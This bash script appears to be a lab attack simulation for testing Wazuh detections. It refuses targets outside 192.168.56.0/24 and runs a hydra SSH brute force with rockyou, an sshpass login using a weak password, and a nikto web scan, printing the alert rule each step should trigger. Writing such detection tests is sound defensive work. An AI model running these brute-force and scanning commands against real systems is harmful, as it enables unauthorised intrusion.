#!/usr/bin/env bash
# Attack simulation — LAB ONLY.
# Refuses to run unless the target is inside 192.168.56.0/24.

set -euo pipefail

TARGET="${1:-192.168.56.20}"

# ── Safety gate ──────────────────────────────────────────────────────
if ! [[ "$TARGET" =~ ^192\.168\.56\. ]]; then
  echo "REFUSING: target '$TARGET' is outside 192.168.56.0/24" >&2
  echo "This script is for the isolated lab network only." >&2
  exit 2
fi

echo "[*] Target: $TARGET"
echo "[*] This will generate real attack traffic. Press Ctrl+C to abort."
sleep 3

# ── SSH brute force (should trigger rule 5712/5763) ──────────────────
echo "[*] PB-01: SSH brute force via hydra (60s)"
hydra -l labuser -P /usr/share/wordlists/rockyou.txt \
      -t 4 -f -V "$TARGET" ssh || true
echo "[*] Expected: Wazuh rule 5712 or 5763 -> pb01_ssh_bruteforce"

sleep 5

# ── Compromised account (weak labuser password 'password') ───────────
echo "[*] PB-02: SSH login after failure burst"
sshpass -p 'password' ssh -o StrictHostKeyChecking=no \
        "labuser@$TARGET" 'echo logged-in' || true
echo "[*] Expected: custom rule 100100 -> pb02_compromised_account"

sleep 5

# ── Web attack burst (should trigger 31151/31153/31154) ──────────────
echo "[*] PB-03: web attack burst via nikto"
nikto -h "http://$TARGET" -Tuning 123bde -maxtime 60s || true
echo "[*] Expected: Wazuh rule 31151/31153/31154 -> pb03_web_attack_burst"

echo
echo "[*] Done. Check Slack #soc-alerts and:"
echo "    tail -f /var/ossec/logs/integrations/soar.log"
